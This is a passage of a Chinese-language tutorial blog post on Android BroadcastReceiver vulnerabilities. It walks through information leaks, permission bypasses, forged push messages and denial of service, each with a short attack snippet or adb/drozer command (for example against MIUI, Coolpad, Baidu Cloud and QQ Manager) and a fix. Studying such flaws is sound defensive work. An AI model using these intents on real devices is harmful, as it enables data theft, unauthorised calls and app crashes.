class=\"line\">对于应用内广播的动态注册（LocalBroadcastManager方式），回调onReceive(context, intent)中的context返回值是：Application Context</span><br><span class=\"line\">对于应用内广播的动态注册（非LocalBroadcastManager方式），回调onReceive(context, intent)中的context返回值是：Activity Context</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-Broadcast-Reciver漏洞的种类和危害\"><a href=\"#2-Broadcast-Reciver漏洞的种类和危害\" class=\"headerlink\" title=\"2.Broadcast Reciver漏洞的种类和危害\"></a>2.Broadcast Reciver漏洞的种类和危害</h3><p>Broadcast Reciver漏洞大致可以分为：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0011/8.png\" alt=\"image-20210912155436267\"></p>\n<p>Broadcast Reciver漏洞的危害：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">BroadcastReceiver是四大组件之一，这个组件涉及：广播发送者和广播接收者，这里的广播实际上指的是intent当发送一个广播是，系统会将发送的广播(intent)与系统中所有注册的符合条件的接IntentFilter进行匹配，匹配成功，则执行相应的onReceive函数</span><br><span class=\"line\">发送广播时，如果处理不当，恶意应用便可以嗅探，拦截广播，致使敏感数据泄露，接收广播时处理不当，便会导致拒绝服务攻击、伪造消息、越权操作等</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0011/9.png\" alt=\"image-20210912155436267\"></p>\n<h2 id=\"三、Broadcast-Reciver漏洞原理分析和复现\"><a href=\"#三、Broadcast-Reciver漏洞原理分析和复现\" class=\"headerlink\" title=\"三、Broadcast Reciver漏洞原理分析和复现\"></a>三、Broadcast Reciver漏洞原理分析和复现</h2><h3 id=\"1-敏感信息泄漏漏洞\"><a href=\"#1-敏感信息泄漏漏洞\" class=\"headerlink\" title=\"1.敏感信息泄漏漏洞\"></a>1.敏感信息泄漏漏洞</h3><h4 id=\"（1）原理介绍\"><a href=\"#（1）原理介绍\" class=\"headerlink\" title=\"（1）原理介绍\"></a>（1）原理介绍</h4><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">发送的intent没有明确指定接收者，而是简单的通过action进行匹配，恶意应用便可以注册一个广播接收者嗅探拦截到这个广播，如果这个广播存在敏感数据，就被恶意应用窃取了。</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"（2）漏洞复现\"><a href=\"#（2）漏洞复现\" class=\"headerlink\" title=\"（2）漏洞复现\"></a>（2）漏洞复现</h4><p>案例1：</p>\n<p>我们发现一个目标程序段代码如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title function_\">d</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    <span class=\"type\">Intent</span> <span class=\"variable\">v1</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Intent</span>();</span><br><span class=\"line\">    v1.setAction(<span class=\"string\">&quot;com.sample.action.server_running&quot;</span>);</span><br><span class=\"line\">    v1.putExtra(<span class=\"string\">&quot;local_ip&quot;</span>,v0.h);</span><br><span class=\"line\">    v1.putExtra(<span class=\"string\">&quot;port&quot;</span>,v0.i);</span><br><span class=\"line\">    v1.putExtra(<span class=\"string\">&quot;code&quot;</span>,v0.g);</span><br><span class=\"line\">    v1.putExtra(<span class=\"string\">&quot;connected&quot;</span>,v0.s);</span><br><span class=\"line\">    v1.putExtra(<span class=\"string\">&quot;pwd_predefined&quot;</span>,v0.r);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!TextUtils.isEmpty(v0.t))&#123;</span><br><span class=\"line\">        v1.putExtra(<span class=\"string\">&quot;connected_usr&quot;</span>,v0.t);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    sendBroadcast(v1);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>通过分析得出，该程序通过intent隐式传递，并通过action匹配发送一个广播，这样系统内其他程序都可以接收到这个广播，然后在广播接收者中编写接收代码，这样我们可以编写攻击代码获取敏感数据信息</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">onReceive</span><span class=\"params\">(Context context,Intent intent)</span>&#123;</span><br><span class=\"line\">    <span class=\"type\">String</span> <span class=\"variable\">s</span> <span class=\"operator\">=</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(intent.getAction().equals(<span class=\"string\">&quot;com.sample.action.server_running&quot;</span>))&#123;</span><br><span class=\"line\">        String pwd=intent.getStringExtra(<span class=\"string\">&quot;connected&quot;</span>);</span><br><span class=\"line\">        s=<span class=\"string\">&quot;Airdroid =&gt; [&quot;</span>+pwd+<span class=\"string\">&quot;]/&quot;</span>+intent.getExtras();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    Toast.makeTest(context,String.format(<span class=\"string\">&quot;%sReceived&quot;</span>,s),Toast.LENGTH_SHORT).show();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>我们就可以通过广播获取该程序的密码</p>\n<p><strong>修复：</strong></p>\n<p>我们尝试采用本地广播的方式，这样程序发出的广播就只能被app自身广播接收器接收</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">Intent</span> <span class=\"variable\">intent</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Intent</span>(<span class=\"string\">&quot;my-sensitive-event&quot;</span>);</span><br><span class=\"line\">intent.putExtra(<span class=\"string\">&quot;event&quot;</span>,<span class=\"string\">&quot;this is a test event&quot;</span>);</span><br><span class=\"line\">LocalBroadcastManager.getInstance(<span class=\"built_in\">this</span>).sendBroadcast(intent);</span><br></pre></td></tr></table></figure>\n\n<p>案例2：<a href=\"https://wwws.nightwatchcybersecurity.com/2018/11/11/cve-2018-9581/\">Android 操作系统中通过 RSSI 广播暴露敏感数据 （CVE-2018-9581)</a></p>\n<p>漏洞详情：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">\tAndroid操作系统会定期在系统范围内广播WiFI强度值（RSSI）,RSSI值表示设备接收到的信号</span><br><span class=\"line\">的相对强度（更高=更强），但与实际物理强度dBm没有直接关系，这是通过两个独立的intents实现的，Android <span class=\"number\">9</span>之前是android.net.wifi.STATE_CHANGE，其他安卓设备是android.net.wifi.RSSI_CHANGED</span><br><span class=\"line\">\t当应用通过WifiManager访问信息时，正常就在应用manifest中请求ACCESS_WIFI_STATE权限。因为WiFi RTT特征是Android <span class=\"number\">9</span>中新引入的，也是用于位置定位的，需要ACCESS_FINE_LOCATION权限。但监听系统广播时，</span><br><span class=\"line\">在不需要通知用户，不需要其他权限的情况下就可以获取信息</span><br><span class=\"line\">\t存在的安全问题：</span><br><span class=\"line\">\t（<span class=\"number\">1</span>）RSSI值是通过广播获取的，绕过的正常的权限检查（ACCESS_WIFI_STATE）</span><br><span class=\"line\">\t（<span class=\"number\">2</span>）通过广播或WiFimanager获取的RSSI值可以在不需要其他位置权限的情况下进行室内定制</span><br></pre></td></tr></table></figure>\n\n<p>攻击代码：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">MainActivity</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">Activity</span> &#123;</span><br><span class=\"line\"><span class=\"meta\">@Override</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">onCreate</span><span class=\"params\">(Bundle state)</span> &#123;</span><br><span class=\"line\">    <span class=\"type\">IntentFilter</span> <span class=\"variable\">filter</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">IntentFilter</span>();        </span><br><span class=\"line\">    filter.addAction(android.net.wifi.STATE_CHANGE);</span><br><span class=\"line\">    filter.addAction(android.net.wifi.RSSI_CHANGED);</span><br><span class=\"line\">    registerReceiver(receiver, filter);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"type\">BroadcastReceiver</span> <span class=\"variable\">receiver</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">BroadcastReceiver</span>() &#123;</span><br><span class=\"line\"><span class=\"meta\">@Override</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">onReceive</span><span class=\"params\">(Context context, Intent intent)</span> &#123;</span><br><span class=\"line\">    Log.d(intent.toString());</span><br><span class=\"line\">    ….</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n<p>测试步骤：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">（<span class=\"number\">1</span>）安装Broadcast Monitor app；</span><br><span class=\"line\"></span><br><span class=\"line\">（<span class=\"number\">2</span>）将手机设置为飞行模式；</span><br><span class=\"line\"></span><br><span class=\"line\">（<span class=\"number\">3</span>）进入房间；</span><br><span class=\"line\"></span><br><span class=\"line\">（<span class=\"number\">4</span>）关掉飞行模式，以触发RSSI广播；</span><br><span class=\"line\"></span><br><span class=\"line\">（<span class=\"number\">5</span>）从以下广播中获取RSSI值：</span><br><span class=\"line\">\tandroid.net.wifi.RSSI_CHANGE – newRssi value</span><br><span class=\"line\">\tandroid.net.wifi.STATE_CHANGE – networkInfo / RSSI</span><br><span class=\"line\"></span><br><span class=\"line\">（<span class=\"number\">6</span>）重复步骤<span class=\"number\">3</span>-<span class=\"number\">4</span>。</span><br></pre></td></tr></table></figure>\n\n<p>我们可以利用广播接收者获取广播中的敏感信息RSSI值</p>\n<h3 id=\"2-权限绕过漏洞\"><a href=\"#2-权限绕过漏洞\" class=\"headerlink\" title=\"2.权限绕过漏洞\"></a>2.权限绕过漏洞</h3><h4 id=\"（1）原理介绍-1\"><a href=\"#（1）原理介绍-1\" class=\"headerlink\" title=\"（1）原理介绍\"></a>（1）原理介绍</h4><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">可以通过两种方式注册广播接收器，一种是在AndroidManifest.xml文件中通过&lt;receiver&gt;标签静态注册，另一种是通过Context.registerReceiver()动态注册，指定相应的intentFilter参数，动态注册的广播默认都是导出的，如果导出的BroadcastReceiver没有做权限控制，导致BroadcastReceiver组件可以接收一个外部可控的url、或者其他命令，导致攻击者可以越权利用应用的一些特定功能，比如发送恶意广播、伪造消息、任意应用下载安装、打开钓鱼网站等</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"（2）漏洞复现-1\"><a href=\"#（2）漏洞复现-1\" class=\"headerlink\" title=\"（2）漏洞复现\"></a>（2）漏洞复现</h4><p>案例1：<a href=\"https://wooyun.x10sec.org/static/bugs/wooyun-2012-09175.html\">小米MIUI漏洞可能导致硬件资源消耗</a></p>\n<p>漏洞详情：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">MIUI内置的手电筒软件Stk.apk中，TorchService服务没有对广播来源进行验证，导致任何程序可以调用这个服务，打开或关闭手电筒，利用这个漏洞，可以导致系统电源迅速消耗</span><br></pre></td></tr></table></figure>\n\n<p>漏洞攻击代码：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">Intent</span> <span class=\"variable\">intent</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Intent</span>();</span><br><span class=\"line\">intent.setAction(<span class=\"string\">&quot;net.cactii.flash2.TOGGLE_FLASHLIGHT&quot;</span>);</span><br><span class=\"line\">sendBroadcast(intent);</span><br></pre></td></tr></table></figure>\n\n<p>我们这里就是通过intent隐私传递，发送广播，然后匹配小米应用中的action，这样就可以打开或广播手电筒，从而利用这个漏洞，导致系统电源迅速消耗</p>\n<p><strong>修复：</strong></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">三种方法：</span><br><span class=\"line\"><span class=\"number\">1.</span> 在AndroidManifest.xml中，将TorchService申明为export=<span class=\"string\">&quot;false&quot;</span>的；</span><br><span class=\"line\"><span class=\"number\">2.</span> 在AndroidManifest.xml中，申明一个私有权限，级别为signature，并为TorchService申明需要这个权限；</span><br><span class=\"line\"><span class=\"number\">3.</span> 在TorchService的实现代码中，检查Intent的来源是否Stk.apk自身。</span><br></pre></td></tr></table></figure>\n\n<p>案例2：<a href=\"https://wooyun.x10sec.org/static/bugs/wooyun-2014-084520.html\">酷派最安全手机s6拨打电话权限绕过</a></p>\n<p>漏洞详情：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">酷派最安全手机s6拨打电话权限绕过，第三方app可以无需拨打电话权限直接拨打电话</span><br></pre></td></tr></table></figure>\n\n<p>攻击代码：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">Intent</span> <span class=\"variable\">intent</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Intent</span>();</span><br><span class=\"line\">intent.setComponent(<span class=\"keyword\">new</span> <span class=\"title class_\">ComponentName</span>(<span class=\"string\">&quot;com.android.phone&quot;</span>,<span class=\"string\">&quot;com.android.phone.PhoneGlobals$NotificationBroadcastReceiver&quot;</span>));</span><br><span class=\"line\">intent.setAction(<span class=\"string\">&quot;com.android.phone.ACTION_CALL_BACK_FROM_NOTIFICATION&quot;</span>);</span><br><span class=\"line\">intent.setData(Uri.parse(<span class=\"string\">&quot;tel:10000&quot;</span>));</span><br><span class=\"line\">intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);</span><br><span class=\"line\">sendBroadcast(intent);</span><br></pre></td></tr></table></figure>\n\n<p>通过intent启动外部电话应用，匹配action，并授权标志位，这样就可以不用获取权限，就可以打电话</p>\n<p>修复：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">（1）使用本地广播</span><br><span class=\"line\">（2）对广播的action进行判别</span><br></pre></td></tr></table></figure>\n\n<p>案例3：<a href=\"https://wooyun.x10sec.org/static/bugs/wooyun-2014-084516.html\">酷派最安全手机s6程序锁绕过</a></p>\n<p>漏洞详情：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">程序加锁解锁是靠广播来控制的，并且这两条广播没做权限限制，任意应用可以发送此广播达到恶意解锁、恶意锁定应用的目的</span><br></pre></td></tr></table></figure>\n\n<p>漏洞测试：</p>\n<p>  简单测试方法用adb shell 发送广播，用来解锁  </p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0011/10.png\" alt=\"image-20210912155436267\"></p>\n<p>然后使用命令行</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">adb shell am broadcast -a android.intent.action.PACKAGE_FULLY_REMOVED -d <span class=\"keyword\">package</span>:com.wumii.android.mimi</span><br></pre></td></tr></table></figure>\n\n<p>就可以成功解锁：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0011/11.png\" alt=\"image-20210912155436267\"></p>\n<p><strong>修复：</strong></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">推荐使用呢LocalBroadcastManager类,这个类相较于Context.sendBroadcast(intent)有下面三方面的优势：</span><br><span class=\"line\"><span class=\"number\">1.</span>不用担心敏感数据泄露，通过这种方式发送的广播只能应用内接收。</span><br><span class=\"line\"><span class=\"number\">2.</span>不用担心安全漏洞被利用，因为其他应用无法发送恶意广播给你。</span><br><span class=\"line\"><span class=\"number\">3.</span>它比系统的全局广播更高效。</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-消息伪造\"><a href=\"#3-消息伪造\" class=\"headerlink\" title=\"3.消息伪造\"></a>3.消息伪造</h3><h4 id=\"（1）漏洞介绍\"><a href=\"#（1）漏洞介绍\" class=\"headerlink\" title=\"（1）漏洞介绍\"></a>（1）漏洞介绍</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">暴露的Receiver对外接收Intent，如果构造恶意的消息放在Intent中传输，被调用的Receiver接收可能产生安全隐患</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"（2）漏洞复现-2\"><a href=\"#（2）漏洞复现-2\" class=\"headerlink\" title=\"（2）漏洞复现\"></a>（2）漏洞复现</h4><p>案例1：<a href=\"https://wooyun.x10sec.org/static/bugs/wooyun-2013-039801.html\">百度云盘手机版钓鱼、信息泄露和代码执行高危漏洞三合一</a></p>\n<p>漏洞描述：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">百度云盘手机版存在高危漏洞，恶意攻击者通过该漏洞可以对手机用户进行钓鱼欺骗，盗取用户隐私文件和信息，以百度云盘APP权限执行任何代码。百度云盘有一个广播接收器没有对消息进行安全验证，通过发送恶意的消息，攻击者可以在用户手机通知栏上推送任意消息，点击消息后可以利用webview组件盗取本地隐私文件和执行任意代码。</span><br><span class=\"line\">   存在漏洞的组件是：com.baidu.android.pushservice.action.MESSAGE</span><br></pre></td></tr></table></figure>\n\n<p>攻击代码：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">Intent</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Intent</span>();</span><br><span class=\"line\">  \ti.setAction(<span class=\"string\">&quot;com.baidu.android.pushservice.action.MESSAGE&quot;</span>)；</span><br><span class=\"line\">      <span class=\"type\">Bundle</span> <span class=\"variable\">b</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Bundle</span>();</span><br><span class=\"line\">      <span class=\"keyword\">try</span> &#123; </span><br><span class=\"line\">      \t<span class=\"type\">JSONObject</span> <span class=\"variable\">jsobject</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">JSONObject</span>();</span><br><span class=\"line\"> \t<span class=\"comment\">//1. phishing</span></span><br><span class=\"line\">          <span class=\"type\">JSONObject</span> <span class=\"variable\">custom_content_js</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">JSONObject</span>();</span><br><span class=\"line\">      \tjsobject.put(<span class=\"string\">&quot;title&quot;</span>, <span class=\"string\">&quot;百度云盘【漏洞你中奖了！】&quot;</span>);</span><br><span class=\"line\">      \tjsobject.put(<span class=\"string\">&quot;description&quot;</span>, <span class=\"string\">&quot;&quot;</span>);</span><br><span class=\"line\">      \t<span class=\"comment\">//jsobject.put(&quot;url&quot;, &quot;http://bcscdn.baidu.com/netdisk/BaiduYun_5.1.0.apk&quot;);</span></span><br><span class=\"line\">      \tjsobject.put(<span class=\"string\">&quot;url&quot;</span>, <span class=\"string\">&quot;http://drops.wooyun.org/webview.html&quot;</span>);</span><br><span class=\"line\">      \t<span class=\"type\">JSONObject</span> <span class=\"variable\">customcontent_js</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">JSONObject</span>();       \t</span><br><span class=\"line\">      \tcustomcontent_js.put(<span class=\"string\">&quot;type&quot;</span>, <span class=\"string\">&quot;1&quot;</span>);</span><br><span class=\"line\">      \tcustomcontent_js.put(<span class=\"string\">&quot;msg_type&quot;</span>, <span class=\"string\">&quot;resources_push&quot;</span>);</span><br><span class=\"line\">      \tcustomcontent_js.put(<span class=\"string\">&quot;uk&quot;</span>, <span class=\"string\">&quot;1&quot;</span>);</span><br><span class=\"line\">      \tcustomcontent_js.put(<span class=\"string\">&quot;shareId&quot;</span>, <span class=\"string\">&quot;1&quot;</span>);  \t</span><br><span class=\"line\">      \tjsobject.put(<span class=\"string\">&quot;custom_content&quot;</span>, customcontent_js);   \t</span><br><span class=\"line\">    <span class=\"type\">String</span> <span class=\"variable\">cmd</span>  <span class=\"operator\">=</span> jsobject.toString();</span><br><span class=\"line\">\tb.putByteArray(<span class=\"string\">&quot;message&quot;</span>, cmd.getBytes(<span class=\"string\">&quot;UTF-8&quot;</span>));</span><br><span class=\"line\">&#125; <span class=\"keyword\">catch</span> (Exception e) &#123;</span><br><span class=\"line\">\t<span class=\"comment\">// TODO Auto-generated catch block</span></span><br><span class=\"line\">\te.printStackTrace();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>修复：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\">设置为签名验证</span><br><span class=\"line\">android:protectionLevel=&quot;signature&quot;</span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">receiver</span> <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;com.umeng.message.UmengMessageBootReceiver&quot;</span> <span class=\"attr\">android:protectionLevel</span>=<span class=\"string\">&quot;signature&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">intent-filter</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">action</span> <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;android.intent.action.BOOT_COMPLETED&quot;</span>/&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">intent-filter</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">receiver</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"4-拒绝服务\"><a href=\"#4-拒绝服务\" class=\"headerlink\" title=\"4.拒绝服务\"></a>4.拒绝服务</h3><h4 id=\"（1）漏洞介绍-1\"><a href=\"#（1）漏洞介绍-1\" class=\"headerlink\" title=\"（1）漏洞介绍\"></a>（1）漏洞介绍</h4><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">如果敏感的BroadcastReceiver没有设置相应的权限保护，很容易受到攻击。最常见的是拒绝服务攻击。拒绝服务攻击指的是，传递恶意畸形的intent数据给广播接收器，广播接收器无法处理异常导致crash。</span><br><span class=\"line\">拒绝服务攻击的危害视具体业务场景而定，比如一个安全防护产品的拒绝服务、锁屏应用的拒绝服务、支付进程的拒绝服务等危害就是巨大的。</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"（2）漏洞复现-3\"><a href=\"#（2）漏洞复现-3\" class=\"headerlink\" title=\"（2）漏洞复现\"></a>（2）漏洞复现</h4><p>案例1：<a href=\"https://wooyun.x10sec.org/static/bugs/wooyun-2013-042755.html\">QQ手机管家拒绝服务漏洞</a></p>\n<p>漏洞描述：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">恶意软件发送一个消息就可以轻松让QQ手机管家拒绝服务，安全防护完全失灵。</span><br><span class=\"line\">com.tencent.qqpimsecure.service.InOutCallReceiver这个广播组件没有对消息进行校验，导致空消息造成<span class=\"literal\">null</span> point问题，直接crash.</span><br></pre></td></tr></table></figure>\n\n<p>攻击代码：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">Intent</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Intent</span>();</span><br><span class=\"line\"><span class=\"type\">ComponentName</span> <span class=\"variable\">componetName</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ComponentName</span>(  <span class=\"string\">&quot;com.tencent.qqpimsecure&quot;</span>,  <span class=\"string\">&quot;com.tencent.qqpimsecure.service.InOutCallReceiver&quot;</span>);         </span><br><span class=\"line\">i.setComponent(componetName);       </span><br><span class=\"line\">sendBroadcast(i);</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0011/12.png\" alt=\"image-20210912155436267\"></p>\n<p>案例2：fourgoats.apk拒绝服务攻击崩溃</p>\n<p>我们首先用drozer测试可导出组件</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">run app.broadcast.info  -a org.owasp.goatdroid.fourgoats</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0011/13.png\" alt=\"image-20210912155436267\"></p>\n<p>我们根据组件的类名找对对应的源码信息，发现需要两个参数 phoneNumber、message：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0011/14.png\" alt=\"image-20210912155436267\"></p>\n<p>我们发送恶意广播:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">run app.broadcast.send --action 广播名 --extra string name lisi</span><br></pre></td></tr></table></figure>\n\n<p>在此之前，我们在AndroidManifest.xml文件里面获取广播名：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0011/15.png\" alt=\"image-20210912155436267\"></p>\n<p>我们发送恶意广播：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">run app.broadcast.send --action org.owasp.goatdroid.fourgoats.SOCIAL_SMS --extra string phoneNumber <span class=\"number\">1234</span> --extra string message dog</span><br></pre></td></tr></table></figure>\n\n<p>可以发现我们恶意广播发送成功</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0011/16.png\" alt=\"image-20210912155436267\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0011/17.png\" alt=\"image-20210912155436267\"></p>\n<p>我们再向广播组件发送不完整intent，使用空 extras，可以看到应用停止运行：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">run app.broadcast.send --action &lt;action&gt;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0011/18.png\" alt=\"image-20210912155436267\"></p>\n<p>我们就成功完成一次拒绝服务攻击</p>\n<p>修复：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">空指针异常</span><br><span class=\"line\">类型转换异常</span><br><span class=\"line\">数组越界访问异常</span><br><span class=\"line\">类未定义异常</span><br><span class=\"line\">其他异常</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//Serializable：</span></span><br><span class=\"line\"><span class=\"type\">Intent</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> <span class=\"built_in\">this</span>.getIntent();</span><br><span class=\"line\"><span class=\"keyword\">if</span>(i.getAction().equals(“serializable_action”))&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">  i.getSerializableExtra(<span class=\"string\">&quot;serializable_key&quot;</span>);<span class=\"comment\">//未做异常判断</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//Parcelable:</span></span><br><span class=\"line\"><span class=\"built_in\">this</span>.b=(RouterConfig)<span class=\"built_in\">this</span>.getIntent().getParcelableExtra(“filed_router_config”);<span class=\"comment\">//引发转型异常崩溃</span></span><br><span class=\"line\"></span><br><span class=\"line\">谨慎处理接收的intent以及其携带的信息。</span><br><span class=\"line\">对接收到的任何数据做<span class=\"keyword\">try</span> <span class=\"keyword\">catch</span>处理，以及对不符合预期的数据做异常处理。</span><br></pre></td></tr></table></figure>\n\n<p>拒绝服务攻击可以参考Activity的拒绝服务攻击和Service的拒绝服务攻击</p>\n<h2 id=\"四、Broadcast-Reciver的安全防护\"><a href=\"#四、Broadcast-Reciver的安全防护\" class=\"headerlink\" title=\"四、Broadcast Reciver的安全防护\"></a>四、Broadcast Reciver的安全防护</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">（<span class=\"number\">1</span>）私有广播接收器设置exported=’<span class=\"literal\">false</span>’,并且不配置intent-filter。(私有广播接收器依然能接收到同UID的广播)。</span><br><span class=\"line\">（<span class=\"number\">2</span>）对接收来的广播进行验证。</span><br><span class=\"line\">（<span class=\"number\">3</span>）内部app之间的广播使用protectionLevel=’signature’ 验证其是否真是内部app。</span><br><span class=\"line\">（<span class=\"number\">4</span>）返回结果时需注意接收app是否会泄露信息。</span><br><span class=\"line\">（<span class=\"number\">5</span>）发送的广播包含敏感信息时需指定广播接收器，使用显示意图或者setPackage(String packageName)。</span><br><span class=\"line\">（<span class=\"number\">6</span>）使用LocalBroadcastManager。</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"五、实验总结\"><a href=\"#五、实验总结\" class=\"headerlink\" title=\"五、实验总结\"></a>五、实验总结</h2><p>本文主要介绍了Android中广播机制的运行原理，并对Android广播机制中的常见漏洞做了一个初步的总结，我们可以发现Android的四大组件的漏洞原理基本存在很大的相关性，在拒绝服务攻击中，这里用了一个简易的样本，并逐步实现了拒绝服务攻击的步骤，本文可能还存在很多不足，后续逐步完善，也欢迎各位大佬指正。</p>\n<h2 id=\"六、参考网址\"><a href=\"#六、参考网址\" class=\"headerlink\" title=\"六、参考网址\"></a>六、参考网址</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Android第一行代码</span><br><span class=\"line\">https://www.jianshu.com/p/ca3d87a4cdf3</span><br><span class=\"line\">https://blog.csdn.net/q376794191/article/details/85292952</span><br><span class=\"line\">https://www.cnblogs.com/lwbqqyumidi/p/4168017.html</span><br><span class=\"line\">https://www.jianshu.com/p/c1a826a5beea</span><br><span class=\"line\">https://www.jianshu.com/p/e236a2669797</span><br><span class=\"line\">https://www.jianshu.com/p/e236a2669797</span><br><span class=\"line\">https://wwws.nightwatchcybersecurity.com/2018/11/11/cve-2018-9581/</span><br><span 